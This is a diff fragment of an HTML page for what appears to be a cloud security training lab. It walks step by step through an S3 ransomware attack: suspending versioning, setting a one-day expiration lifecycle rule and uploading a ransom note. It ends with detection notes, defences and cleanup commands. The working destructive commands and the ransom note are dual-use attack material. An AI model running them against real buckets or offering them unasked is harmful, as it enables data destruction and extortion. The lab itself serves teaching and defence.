+            <div class="terminal-cmd">$ aws s3 ls s3://critical-data-prod --summarize --human-readable</div>
+            <div class="terminal-output">Total Objects: 847,293
+Total Size: 2.4 TiB</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Step 1 of the attack sequence: suspend versioning FIRST. With versioning active, victims can restore objects from version history even after a lifecycle rule deletes the current version. Suspending versioning closes that recovery path before the deletion timer starts.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Step 1: Suspend versioning to prevent recovery via version history
+$ aws s3api put-bucket-versioning \
+  --bucket critical-data-prod \
+  --versioning-configuration Status=Suspended</div>
+            <div class="terminal-output"># Versioning suspended — deletions are now permanent for new writes</div>
+          </div>
+        </div>
+        <div class="warning"><i class="fa-solid fa-triangle-exclamation"></i> <strong>Attack order matters:</strong> Lifecycle rules set BEFORE suspending versioning can still be countered by recovering from existing version history. Always suspend versioning first to eliminate the version-history recovery path before the deletion countdown begins.</div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Step 2: Set an aggressive lifecycle rule that expires all objects in 1 day. Also add <code>NoncurrentVersionExpiration</code> to destroy any pre-existing version history that was in place before you suspended versioning.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Step 2: Set aggressive lifecycle rule for deletion
+$ cat lifecycle.json</div>
+            <div class="terminal-output">{
+  "Rules": [{
+    "ID": "cleanup-expired-objects",
+    "Status": "Enabled",
+    "Filter": {},
+    "Expiration": {
+      "Days": 1
+    },
+    "NoncurrentVersionExpiration": {
+      "NoncurrentDays": 1
+    }
+  }]
+}</div>
+            <div class="terminal-cmd">$ aws s3api put-bucket-lifecycle-configuration \
+  --bucket critical-data-prod \
+  --lifecycle-configuration file://lifecycle.json</div>
+            <div class="terminal-output"># Lifecycle rule set — all 847,293 objects expire in 24 hours
+# NoncurrentVersionExpiration also destroys any existing version history</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Upload a ransom note to every targeted bucket. The note warns the victim that their data will be permanently deleted unless they pay.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ echo "=== YOUR DATA WILL BE PERMANENTLY DELETED IN 24 HOURS ===
+
+All objects in this bucket have been scheduled for deletion.
+Versioning has been suspended. There is no recovery path.
+
+To prevent data loss:
+1. Send 15 BTC to: bc1q...attacker...address
+2. Email proof of payment to: ransom@securemail.onion
+3. We will remove the lifecycle rule within 1 hour of confirmation
+
+Do NOT:
+- Contact AWS Support (they cannot override lifecycle rules)
+- Attempt to re-enable versioning (existing objects are not protected)
+- Delete this file (we will know)
+
+Clock is ticking." | aws s3 cp - s3://critical-data-prod/RANSOM_README.txt</div>
+            <div class="terminal-output">upload: - to s3://critical-data-prod/RANSOM_README.txt</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">After 24 hours, S3 automatically deletes all objects via the lifecycle rule. The victim either pays or permanently loses 2.4 TiB of critical production data.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># T+24 hours — S3 lifecycle executes:</div>
+            <div class="terminal-output">$ aws s3 ls s3://critical-data-prod --summarize
+Total Objects: 1       (only RANSOM_README.txt remains — it was uploaded &lt;24h ago)
+Total Size: 847 Bytes
+
+# 847,292 objects (2.4 TiB) permanently deleted
+# No versioning → no recovery
+# No S3 Object Lock → no immutability protection
+# Backups bucket? Same lifecycle rule applied there too.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Suspend versioning</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Set 1-day lifecycle</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Ransom note</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Auto-delete</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Victim pays or loses data</div>
+    </div>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> This technique maps to <strong>T1485</strong> (Data Destruction). Note: no formally published sub-technique exists for cloud storage lifecycle manipulation as of ATT&amp;CK v16. Earlier drafts circulated a T1485.001 designation but it was not merged into the framework. Defend with S3 Object Lock (Governance or Compliance mode), MFA Delete, bucket policies denying <code>s3:PutLifecycleConfiguration</code>, and cross-account backup replication to an immutable vault.</div>
+
+  <!-- DETECTION NOTES -->
+  <div class="note" style="margin-top:1rem;">
+    <strong><i class="fa-solid fa-magnifying-glass"></i> Detection Notes (L05):</strong>
+    <ul>
+      <li>CloudTrail: alert on <code>s3:PutBucketVersioning</code> (Status=Suspended) and <code>s3:PutLifecycleConfiguration</code> on the same bucket within a short time window</li>
+      <li>AWS Config rule <code>s3-bucket-versioning-enabled</code> will fire when versioning is suspended on a previously versioned bucket</li>
+      <li>S3 Object Lock with Compliance mode prevents lifecycle rule deletion of locked objects regardless of attacker permissions</li>
+      <li>Cross-account replication to an immutable destination is the most reliable protection — the attacker's credentials cannot affect a separate account's bucket</li>
+    </ul>
+  </div>
+</div>
+
+<!-- CLEANUP -->
+<div class="cleanup" style="margin-top:2rem;">
+  <strong><i class="fa-solid fa-broom"></i> Lab Cleanup (M19 — all labs):</strong>
+  <ol>
+    <li>Re-enable CloudTrail: <code>aws cloudtrail start-logging --name main-trail</code> and restore the original S3 bucket with correct permissions</li>
+    <li>Delete GuardDuty suppression filters: <code>aws guardduty delete-filter --detector-id &lt;id&gt; --filter-name Internal-Scanner-Whitelist</code> and <code>Pen-Test-Exception</code></li>
+    <li>Delete the backdoor Lambda layer: <code>aws lambda delete-layer-version --layer-name boto3-patch --version-number 1</code> and detach from all functions</li>
+    <li>Delete the EventBridge rule and target: <code>aws events remove-targets --rule IAMProtectPersistence --ids 1</code>, then <code>aws events delete-rule --name IAMProtectPersistence</code></li>
+    <li>Remove the S3 lifecycle rule: <code>aws s3api delete-bucket-lifecycle --bucket target-bucket</code> and re-enable versioning: <code>aws s3api put-bucket-versioning --bucket target-bucket --versioning-configuration Status=Enabled</code></li>
+    <li>Delete the exfil Lambda function: <code>aws lambda delete-function --function-name iam-compliance-forwarder</code></li>
+  </ol>
+</div>
